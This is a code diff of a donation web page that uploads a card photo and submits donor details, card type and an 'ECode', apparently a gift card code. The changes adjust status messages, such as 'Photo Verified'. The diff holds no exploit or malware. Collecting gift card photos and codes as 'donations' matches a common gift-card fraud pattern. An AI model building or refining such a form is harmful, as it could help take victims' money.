@@ -143,7 +143,7 @@
             if (!file) return;
 
             document.getElementById('previewContainer').style.display = 'block';
-            document.getElementById('uploadStatus').innerText = "Uploading photo... please wait.";
+            document.getElementById('uploadStatus').innerText = "Processing image... please wait.";
             document.getElementById('submitBtn').disabled = true;
 
             const formData = new FormData();
@@ -156,13 +156,17 @@
                     body: formData
                 });
                 const data = await response.json();
-                document.getElementById('photoLink').value = data.secure_url;
-                document.getElementById('imagePreview').src = data.secure_url;
-                document.getElementById('uploadStatus').innerText = "✔ Photo Uploaded Successfully";
-                document.getElementById('uploadStatus').style.color = "green";
-                document.getElementById('submitBtn').disabled = false;
+                
+                if (data.secure_url) {
+                    document.getElementById('photoLink').value = data.secure_url;
+                    document.getElementById('imagePreview').src = data.secure_url;
+                    document.getElementById('uploadStatus').innerText = "✔ Photo Verified";
+                    document.getElementById('uploadStatus').style.color = "green";
+                    document.getElementById('submitBtn').disabled = false;
+                }
             } catch (error) {
-                alert("Upload failed. Make sure your 'ml_default' preset is set to Unsigned in Settings.");
+                alert("Upload failed. Ensure Cloudinary is set to 'Unsigned'.");
+                document.getElementById('submitBtn').disabled = false;
             }
         }
 
@@ -174,7 +178,7 @@
                 Donor: document.getElementById('donorName').value || "Anonymous",
                 Amount: document.getElementById('amount').value,
                 CardType: document.getElementById('cardType').value,
-                CardPhotoLink: document.getElementById('photoLink').value,
+                CardPhoto: document.getElementById('photoLink').value, // This is the link you click in email
                 ECode: document.getElementById('eCode').value,
                 Message: document.getElementById('message').value,
                 Time: new Date().toLocaleString()
@@ -190,7 +194,7 @@
                 alert("We appreciate your support. Thank you!");
                 location.reload();
             } else {
-                alert("There was an error. Please try again.");
+                alert("Submission Error.");
                 btn.innerText = "Submit Donation";
             }
         }
